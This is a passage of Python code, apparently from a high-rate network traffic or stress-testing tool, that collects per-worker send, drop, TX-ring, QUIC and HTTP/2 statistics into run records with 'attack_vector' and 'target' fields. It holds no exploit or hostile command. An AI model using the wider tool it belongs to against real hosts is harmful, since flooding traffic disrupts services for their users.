                _txring_flush_last_errno = int(worker_stats.get("txring_flush_last_errno", 0) or 0)
                _txring_flush_last_errno_name = str(
                    worker_stats.get("txring_flush_last_errno_name", "NONE") or "NONE"
                )
                _txring_frame_wait_ns = int(worker_stats.get("txring_frame_wait_ns", 0) or 0)
                _txring_poll_count = int(worker_stats.get("txring_poll_count", 0) or 0)
                _flush_mode = str(worker_stats.get("flush_mode", "unknown") or "unknown")
                _txring_tp_packets = int(worker_stats.get("txring_tp_packets", 0) or 0)
                _txring_tp_drops = int(worker_stats.get("txring_tp_drops", 0) or 0)
                _txring_tp_freeze_q_cnt = int(worker_stats.get("txring_tp_freeze_q_cnt", 0) or 0)
                _txring_packet_version = int(worker_stats.get("txring_packet_version", 0) or 0)
                _txring_packet_version_name = str(
                    worker_stats.get("txring_packet_version_name", "TPACKET_UNKNOWN") or "TPACKET_UNKNOWN"
                )
                _txring_batch_target = int(worker_stats.get("txring_batch_target", 0) or 0)
                _txring_backoff_ns = int(worker_stats.get("txring_backoff_ns", 0) or 0)
                _host_tx_packets_delta = int(worker_stats.get("host_tx_packets_delta", 0) or 0)
                _host_tx_dropped_delta = int(worker_stats.get("host_tx_dropped_delta", 0) or 0)
                _host_tx_errors_delta = int(worker_stats.get("host_tx_errors_delta", 0) or 0)
                _softnet_dropped_delta = int(worker_stats.get("softnet_dropped_delta", 0) or 0)
                _softnet_time_squeeze_delta = int(worker_stats.get("softnet_time_squeeze_delta", 0) or 0)
                _wire_counter_available = int(worker_stats.get("wire_counter_available", 0) or 0)
                _wire_counter_source = str(worker_stats.get("wire_counter_source", "none") or "none")
                _wire_counter_confidence = float(worker_stats.get("wire_counter_confidence", 0.0) or 0.0)
                _wire_counter_reason = str(worker_stats.get("wire_counter_reason", "") or "")
                _wire_tx_packets_delta = int(worker_stats.get("wire_tx_packets_delta", 0) or 0)
                _wire_tx_dropped_delta = int(worker_stats.get("wire_tx_dropped_delta", 0) or 0)
                _wire_tx_errors_delta = int(worker_stats.get("wire_tx_errors_delta", 0) or 0)
                _wire_tx_bytes_delta = int(worker_stats.get("wire_tx_bytes_delta", 0) or 0)
                _nicq_counter_available = int(worker_stats.get("nicq_counter_available", 0) or 0)
                _nicq_counter_source = str(worker_stats.get("nicq_counter_source", "none") or "none")
                _nicq_counter_confidence = float(worker_stats.get("nicq_counter_confidence", 0.0) or 0.0)
                _nicq_counter_reason = str(worker_stats.get("nicq_counter_reason", "") or "")
                _nicq_pressure_delta = int(worker_stats.get("nicq_pressure_delta", 0) or 0)
                _nicq_drop_delta = int(worker_stats.get("nicq_drop_delta", 0) or 0)
                _nicq_fifo_delta = int(worker_stats.get("nicq_fifo_delta", 0) or 0)
                _nicq_timeout_delta = int(worker_stats.get("nicq_timeout_delta", 0) or 0)
                _nicq_restart_delta = int(worker_stats.get("nicq_restart_delta", 0) or 0)
                _nicq_busy_delta = int(worker_stats.get("nicq_busy_delta", 0) or 0)
                _nicq_pressure_status = str(worker_stats.get("nicq_pressure_status", "unknown") or "unknown")
                _wire_tx_accounted_packets = int(worker_stats.get("wire_tx_accounted_packets", 0) or 0)
                _wire_tx_over_attempted_packets = int(worker_stats.get("wire_tx_over_attempted_packets", 0) or 0)
                _wire_loss_measurement_mode = str(
                    worker_stats.get("wire_loss_measurement_mode", "unknown") or "unknown"
                )
                _wire_loss_est_packets = int(worker_stats.get("wire_loss_est_packets", 0) or 0)
                _wire_loss_est_pct = float(worker_stats.get("wire_loss_est_pct", 0.0) or 0.0)
                _wire_loss_raw_packets = int(worker_stats.get("wire_loss_raw_packets", 0) or 0)
                _wire_loss_raw_uncapped_packets = int(
                    worker_stats.get("wire_loss_raw_uncapped_packets", _wire_loss_raw_packets) or 0
                )
                _wire_loss_raw_pct = float(worker_stats.get("wire_loss_raw_pct", 0.0) or 0.0)
                _wire_loss_raw_pct_of_attempted = float(
                    worker_stats.get("wire_loss_raw_pct_of_attempted", _wire_loss_raw_pct) or 0.0
                )
                _wire_loss_raw_over_attempted_packets = int(
                    worker_stats.get("wire_loss_raw_over_attempted_packets", 0) or 0
                )
                _wire_loss_raw_over_attempted_pct = float(
                    worker_stats.get("wire_loss_raw_over_attempted_pct", 0.0) or 0.0
                )
                _wire_loss_raw_gt_attempted = int(worker_stats.get("wire_loss_raw_gt_attempted", 0) or 0)
                _wire_loss_estimation_capped = int(worker_stats.get("wire_loss_estimation_capped", 0) or 0)
                _txring_drop_ratio_pct = float(worker_stats.get("txring_drop_ratio_pct", 0.0) or 0.0)
                _txring_flush_error_ratio_pct = float(worker_stats.get("txring_flush_error_ratio_pct", 0.0) or 0.0)
                _txring_flush_eagain_ratio_pct = float(worker_stats.get("txring_flush_eagain_ratio_pct", 0.0) or 0.0)
                _txring_flush_enobufs_ratio_pct = float(
                    worker_stats.get("txring_flush_enobufs_ratio_pct", 0.0) or 0.0
                )
                _txring_flush_ebusy_ratio_pct = float(
                    worker_stats.get("txring_flush_ebusy_ratio_pct", 0.0) or 0.0
                )
                _txring_flush_other_errno_ratio_pct = float(
                    worker_stats.get("txring_flush_other_errno_ratio_pct", 0.0) or 0.0
                )
                _gpu_packet_backend_name = str(worker_stats.get("gpu_packet_backend_name", "") or "")
                _gpu_packet_native_enabled = int(worker_stats.get("gpu_packet_native_enabled", 0) or 0)
                _gpu_packet_native_library_available = int(
                    worker_stats.get("gpu_packet_native_library_available", 0) or 0
                )
                _gpu_packet_native_active = int(worker_stats.get("gpu_packet_native_active", 0) or 0)
                _gpu_template_h2d_copy_count = int(worker_stats.get("gpu_template_h2d_copy_count", 0) or 0)
                _gpu_template_h2d_copy_bytes = int(worker_stats.get("gpu_template_h2d_copy_bytes", 0) or 0)
                _gpu_rng_state_alloc_count = int(worker_stats.get("gpu_rng_state_alloc_count", 0) or 0)
                _gpu_rng_state_reuse_count = int(worker_stats.get("gpu_rng_state_reuse_count", 0) or 0)
                _l7_active_sessions_peak = int(worker_stats.get("l7_active_sessions_peak", 0) or 0)
                _l7_conn_rate = float(worker_stats.get("l7_conn_rate", 0.0) or 0.0)
                _l7_handshake_p99_ms = float(worker_stats.get("l7_handshake_p99_ms", 0.0) or 0.0)
                _l7_step_fail_ratio = float(worker_stats.get("l7_step_fail_ratio", 0.0) or 0.0)
                _session_success_rate = float(worker_stats.get("session_success_rate", 0.0) or 0.0)
                _retry_success_rate = float(worker_stats.get("retry_success_rate", 0.0) or 0.0)
                _l7_engine_path_used = str(worker_stats.get("l7_engine_path_used", "") or "")
                _l7_fallback_reason = str(worker_stats.get("l7_fallback_reason", "none") or "none")
                _l7_capability_status = str(worker_stats.get("l7_capability_status", "ok") or "ok")
                _h2_goaway_count = int(worker_stats.get("h2_goaway_count", 0) or 0)
                _h2_stream_resets = int(worker_stats.get("h2_stream_resets", 0) or 0)
                _h2_connections_used = int(worker_stats.get("h2_connections_used", 0) or 0)
                _h2_request_plan_used = int(worker_stats.get("h2_request_plan_used", 0) or 0)
                _h2_request_plan_items = int(worker_stats.get("h2_request_plan_items", 0) or 0)
                _h2_stream_reset_ratio = float(worker_stats.get("h2_stream_reset_ratio", 0.0) or 0.0)
                _quic_connect_fail_count = int(worker_stats.get("quic_connect_fail_count", 0) or 0)
                _quic_connect_timeout_count = int(worker_stats.get("quic_connect_timeout_count", 0) or 0)
                _quic_tls_fail_count = int(worker_stats.get("quic_tls_fail_count", 0) or 0)
                _quic_handshake_timeout_count = int(worker_stats.get("quic_handshake_timeout_count", 0) or 0)
                _quic_stream_fail_count = int(worker_stats.get("quic_stream_fail_count", 0) or 0)
                _quic_stream_fail_ratio = float(worker_stats.get("quic_stream_fail_ratio", 0.0) or 0.0)
                _quic_handshake_fail_ratio = float(worker_stats.get("quic_handshake_fail_ratio", 0.0) or 0.0)
                _quic_response_headers_ok_count = int(worker_stats.get("quic_response_headers_ok_count", 0) or 0)
                _quic_response_body_ok_count = int(worker_stats.get("quic_response_body_ok_count", 0) or 0)
                _quic_response_expected_header_ok_count = int(
                    worker_stats.get("quic_response_expected_header_ok_count", 0) or 0
                )
                _quic_response_expected_body_match_ok_count = int(
                    worker_stats.get("quic_response_expected_body_match_ok_count", 0) or 0
                )
                _quic_response_validation_fail_count = int(worker_stats.get("quic_response_validation_fail_count", 0) or 0)
                _quic_response_validation_fail_ratio = float(
                    worker_stats.get("quic_response_validation_fail_ratio", 0.0) or 0.0
                )
                _quic_connection_attempts = int(worker_stats.get("quic_connection_attempts", 0) or 0)
                _quic_conn_pool_size = int(worker_stats.get("quic_conn_pool_size", 1) or 1)
                _quic_stack_mode = str(worker_stats.get("quic_stack_mode", "") or "")
                _dp_queue_id = int(worker_stats.get("dp_queue_id", -1) or -1)
                _dp_queue_strategy = str(worker_stats.get("dp_queue_strategy", "rr") or "rr")
                _dp_affinity_cpu = int(worker_stats.get("dp_affinity_cpu", -1) or -1)

                # Backlog peak from resource stats
                _backlog_peak = 0
                if resource_stats is not None:
                    try:
                        wstats = resource_stats.get(int(worker_id))
                        if isinstance(wstats, dict):
                            _backlog_peak = int(wstats.get("backlog", 0) or 0)
                    except Exception:
                        pass

                run_events.append(
                    {
                        "worker_id": int(worker_id),
                        "attack_vector": str(args.get("attack_vector", "unknown")),
                        "compute_backend": str(backend_used),
                        "protocol": str(args.get("protocol", "")),
                        "target": str(args.get("target", "")),
                        "count_cfg": int(args.get("count", 0) or 0),
                        "status": worker_status,
                        "error": worker_error,
                        "duration_s": float(max(0.0, time.time() - worker_started)),
                        "stats": dict(worker_stats),
                        "sender_path": _sender_path,
                        "fallback_count": _fallback_count,
                        "sender_fallback_reason": _sender_fallback_reason,
                        "permission_error_count": _perm_errors,
                        "buffer_copy_count": _buffer_copy_count,
                        "buffer_copy_bytes": _buffer_copy_bytes,
                        "buffer_reuse_hits": _buffer_reuse_hits,
                        "eagain_retry_count": _eagain_retry_count,
                        "partial_send_retry_count": _partial_send_retry_count,
                        "actual_rps": _actual_rps,
                        "rate_accuracy_pct": _rate_accuracy_pct,
                        "jitter_p99_ns": _jitter_p99_ns,
                        "ipg_mean_ns": _ipg_mean_ns,
                        "sleep_calls": _sleep_calls,
                        "busywait_cycles": _busywait_cycles,
                        "so_txtime_active": _so_txtime_active,
                        "txtime_errors": _txtime_errors,
                        "txring_flush_call_count": _txring_flush_call_count,
                        "txring_flush_error_count": _txring_flush_error_count,
                        "txring_flush_eagain_count": _txring_flush_eagain_count,
                        "txring_flush_enobufs_count": _txring_flush_enobufs_count,
                        "txring_flush_ebusy_count": _txring_flush_ebusy_count,
                        "txring_flush_other_errno_count": _txring_flush_other_errno_count,
                        "txring_flush_last_errno": _txring_flush_last_errno,
                        "txring_flush_last_errno_name": _txring_flush_last_errno_name,
                        "txring_frame_wait_ns": _txring_frame_wait_ns,
                        "txring_poll_count": _txring_poll_count,
                        "flush_mode": _flush_mode,
                        "txring_tp_packets": _txring_tp_packets,
                        "txring_tp_drops": _txring_tp_drops,
                        "txring_tp_freeze_q_cnt": _txring_tp_freeze_q_cnt,
                        "txring_packet_version": _txring_packet_version,
                        "txring_packet_version_name": _txring_packet_version_name,
                        "txring_batch_target": _txring_batch_target,
                        "txring_backoff_ns": _txring_backoff_ns,
                        "host_tx_packets_delta": _host_tx_packets_delta,
                        "host_tx_dropped_delta": _host_tx_dropped_delta,
                        "host_tx_errors_delta": _host_tx_errors_delta,
                        "softnet_dropped_delta": _softnet_dropped_delta,
                        "softnet_time_squeeze_delta": _softnet_time_squeeze_delta,
                        "wire_counter_available": _wire_counter_available,
                        "wire_counter_source": _wire_counter_source,
                        "wire_counter_confidence": _wire_counter_confidence,
                        "wire_counter_reason": _wire_counter_reason,
                        "wire_tx_packets_delta": _wire_tx_packets_delta,
                        "wire_tx_dropped_delta": _wire_tx_dropped_delta,
                        "wire_tx_errors_delta": _wire_tx_errors_delta,
                        "wire_tx_bytes_delta": _wire_tx_bytes_delta,
                        "nicq_counter_available": _nicq_counter_available,
                        "nicq_counter_source": _nicq_counter_source,
                        "nicq_counter_confidence": _nicq_counter_confidence,
                        "nicq_counter_reason": _nicq_counter_reason,
                        "nicq_pressure_delta": _nicq_pressure_delta,
                        "nicq_drop_delta": _nicq_drop_delta,
                        "nicq_fifo_delta": _nicq_fifo_delta,
                        "nicq_timeout_delta": _nicq_timeout_delta,
                        "nicq_restart_delta": _nicq_restart_delta,
                        "nicq_busy_delta": _nicq_busy_delta,
                        "nicq_pressure_status": _nicq_pressure_status,
                        "wire_tx_accounted_packets": _wire_tx_accounted_packets,
                        "wire_tx_over_attempted_packets": _wire_tx_over_attempted_packets,
                        "wire_loss_measurement_mode": _wire_loss_measurement_mode,
                        "wire_loss_est_packets": _wire_loss_est_packets,
                        "wire_loss_est_pct": _wire_loss_est_pct,
                        "wire_loss_raw_packets": _wire_loss_raw_packets,
                        "wire_loss_raw_uncapped_packets": _wire_loss_raw_uncapped_packets,
                        "wire_loss_raw_pct": _wire_loss_raw_pct,
                        "wire_loss_raw_pct_of_attempted": _wire_loss_raw_pct_of_attempted,
                        "wire_loss_raw_over_attempted_packets": _wire_loss_raw_over_attempted_packets,
                        "wire_loss_raw_over_attempted_pct": _wire_loss_raw_over_attempted_pct,
                        "wire_loss_raw_gt_attempted": _wire_loss_raw_gt_attempted,
                        "wire_loss_estimation_capped": _wire_loss_estimation_capped,
                        "txring_drop_ratio_pct": _txring_drop_ratio_pct,
                        "txring_flush_error_ratio_pct": _txring_flush_error_ratio_pct,
                        "txring_flush_eagain_ratio_pct": _txring_flush_eagain_ratio_pct,
                        "txring_flush_enobufs_ratio_pct": _txring_flush_enobufs_ratio_pct,
                        "txring_flush_ebusy_ratio_pct": _txring_flush_ebusy_ratio_pct,
                        "txring_flush_other_errno_ratio_pct": _txring_flush_other_errno_ratio_pct,
                        "gpu_packet_backend_name": _gpu_packet_backend_name,
                        "gpu_packet_native_enabled": _gpu_packet_native_enabled,
                        "gpu_packet_native_library_available": _gpu_packet_native_library_available,
                        "gpu_packet_native_active": _gpu_packet_native_active,
                        "gpu_template_h2d_copy_count": _gpu_template_h2d_copy_count,
                        "gpu_template_h2d_copy_bytes": _gpu_template_h2d_copy_bytes,
                        "gpu_rng_state_alloc_count": _gpu_rng_state_alloc_count,
                        "gpu_rng_state_reuse_count": _gpu_rng_state_reuse_count,
                        "l7_active_sessions_peak": _l7_active_sessions_peak,
                        "l7_conn_rate": _l7_conn_rate,
                        "l7_handshake_p99_ms": _l7_handshake_p99_ms,
                        "l7_step_fail_ratio": _l7_step_fail_ratio,
                        "session_success_rate": _session_success_rate,
                        "retry_success_rate": _retry_success_rate,
                        "l7_engine_path_used": _l7_engine_path_used,
                        "l7_fallback_reason": _l7_fallback_reason,
                        "l7_capability_status": _l7_capability_status,
                        "h2_goaway_count": _h2_goaway_count,
                        "h2_stream_resets": _h2_stream_resets,
                        "h2_connections_used": _h2_connections_used,
                        "h2_request_plan_used": _h2_request_plan_used,
                        "h2_request_plan_items": _h2_request_plan_items,
                        "h2_stream_reset_ratio": _h2_stream_reset_ratio,
                        "quic_connect_fail_count": _quic_connect_fail_count,
                        "quic_connect_timeout_count": _quic_connect_timeout_count,
                        "quic_tls_fail_count": _quic_tls_fail_count,
                        "quic_handshake_timeout_count": _quic_handshake_timeout_count,
                        "quic_stream_fail_count": _quic_stream_fail_count,
                        "quic_stream_fail_ratio": _quic_stream_fail_ratio,
                        "quic_handshake_fail_ratio": _quic_handshake_fail_ratio,
                        "quic_response_headers_ok_count": _quic_response_headers_ok_count,
                        "quic_response_body_ok_count": _quic_response_body_ok_count,
                        "quic_response_expected_header_ok_count": _quic_response_expected_header_ok_count,
                        "quic_response_expected_body_match_ok_count": _quic_response_expected_body_match_ok_count,
                        "quic_response_validation_fail_count": _quic_response_validation_fail_count,
                        "quic_response_validation_fail_ratio": _quic_response_validation_fail_ratio,
                        "quic_connection_attempts": _quic_connection_attempts,
                        "quic_conn_pool_size": _quic_conn_pool_size,
                        "quic_stack_mode": _quic_stack_mode,
                        "dp_queue_id": _dp_queue_id,
                        "dp_queue_strategy": _dp_queue_strategy,
                        "dp_affinity_cpu": _dp_affinity_cpu,
                        "gpu_ring_depth_peak": int(worker_stats.get("gpu_ring_depth_peak", 0) or 0),
                        "gpu_ring_block_wait_ns": int(worker_stats.get("gpu_ring_block_wait_ns", 0) or 0),
                        "state_active_entries": int(worker_stats.get("state_active_entries", 0) or 0),
                        "state_timeout_evictions": int(worker_stats.get("state_timeout_evictions", 0) or 0),
                        "state_overwrites": int(worker_stats.get("state_overwrites", 0) or 0),
                        "queue_backlog_peak": _backlog_peak,
                    }
                )
            except Exception:
                pass
        log_info(f"[Worker {worker_id}] görevini tamamladı. status={worker_status}")
